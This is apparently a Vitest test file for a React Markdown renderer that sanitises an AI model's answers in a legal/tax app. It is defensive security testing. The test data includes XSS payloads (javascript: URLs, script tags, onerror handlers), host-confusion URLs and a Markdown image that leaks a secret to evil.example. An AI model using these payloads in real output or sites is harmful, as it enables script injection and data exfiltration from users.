// SEC-05, SEC-10: ответ модели выводится безопасно — без HTML и картинок, ссылки только внутренние и pravo.by.
import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { renderWithProviders } from "../../test/render.tsx";
import { linkKind, Markdown } from "./Markdown.tsx";

function renderMd(text: string) {
  return renderWithProviders(<Markdown>{text}</Markdown>);
}

describe("SEC-05: какие ссылки разрешены", () => {
  it.each([
    ["/operations?category=taxi", "internal"],
    ["/laws/Hk0900071?article=210", "internal"],
    ["https://pravo.by/document/?guid=3871&p0=Hk0900071", "pravo"],
    ["https://www.pravo.by/", "pravo"],
  ])("%s — разрешена (%s)", (href, kind) => {
    expect(linkKind(href)).toBe(kind);
  });

  it.each([
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "//evil.example/x",
    "/\\evil.example",
    "http://pravo.by/",
    "https://evil.example/",
    "https://pravo.by.evil.example/",
    "https://pravo.by@evil.example/",
    "https://user:pass@pravo.by/",
    "operations",
    "mailto:a@b.by",
    "/ok\u0000javascript:alert(1)",
    "",
  ])("%j — запрещена", (href) => {
    expect(linkKind(href)).toBe("blocked");
  });
});

describe("SEC-05: вредная разметка в ответе модели", () => {
  it("сырой HTML не становится элементами: ни script, ни img, ни iframe, ни обработчиков событий", () => {
    const { container } = renderMd(
      'Текст <script>window.hacked = 1</script><img src="https://evil.example/x.png" onerror="window.hacked = 2"><iframe src="https://evil.example"></iframe> <b onclick="x()">жирный</b>',
    );
    expect(container.querySelector("script, img, iframe, b, [onerror], [onclick]")).toBeNull();
    expect(container.textContent).toContain("Текст");
  });

  it("Markdown-картинка не рисуется: канал утечки по адресу картинки закрыт", () => {
    const { container } = renderMd("![отчёт](https://evil.example/track.png?q=секрет)");
    expect(container.querySelector("img")).toBeNull();
  });

  it("ссылка на чужой сайт и javascript: остаются текстом без href", () => {
    const { container } = renderMd(
      "[чужая](https://evil.example/) и [скрипт](javascript:alert(1)) и [data](data:text/html,x)",
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("чужая");
    expect(container.textContent).toContain("скрипт");
  });

  it("ссылка на pravo.by открывается в новой вкладке без передачи окна; внутренняя — обычная", () => {
    renderMd("[НК](https://pravo.by/document/?guid=1) и [операции](/operations?category=taxi)");
    const external = screen.getByRole("link", { name: "НК" });
    expect(external).toHaveAttribute("href", "https://pravo.by/document/?guid=1");
    expect(external).toHaveAttribute("target", "_blank");
    expect(external).toHaveAttribute("rel", "noopener noreferrer");
    const internal = screen.getByRole("link", { name: "операции" });
    expect(internal).toHaveAttribute("href", "/operations?category=taxi");
    expect(internal).not.toHaveAttribute("target");
  });

  it("обычная разметка работает: абзацы, списки, жирный; заголовок ответа не создаёт второй h1", () => {
    const { container } = renderMd("# Итог\n\nСумма **15,00 BYN**.\n\n- кофе\n- такси");
    expect(container.querySelector("h1")).toBeNull();
    expect(screen.getByRole("heading", { level: 3, name: "Итог" })).toBeInTheDocument();
    expect(screen.getByText("15,00 BYN").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });
});

describe("CHAT-05: ссылки на цитаты правового ответа", () => {
  it("без renderCite адрес cite:… — запрещённая ссылка: в обычном ответе модели чипов нет", () => {
    renderWithProviders(<Markdown>{"Срок [14 дней](cite:1)."}</Markdown>);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("14 дней")).toBeInTheDocument();
  });

  it("с renderCite метка рисуется чипом внутри строки; номер вне списка — ничего", () => {
    renderWithProviders(
      <Markdown renderCite={(n) => (n === 1 ? <b data-testid="chip">ст. 28</b> : null)}>
        {"Срок [1](cite:1) и [9](cite:9) идёт."}
      </Markdown>,
    );
    expect(screen.getByTestId("chip")).toHaveTextContent("ст. 28");
    expect(screen.getByTestId("chip").closest("p")).toHaveTextContent("Срок ст. 28 и идёт.");
  });

  it("с renderCite обычные ссылки по-прежнему проверяются: чужой адрес остаётся текстом", () => {
    renderWithProviders(
      <Markdown renderCite={() => null}>{"[сюда](https://evil.example/)"}</Markdown>,
    );
    expect(screen.queryByRole("link")).toBeNull();
  });
});
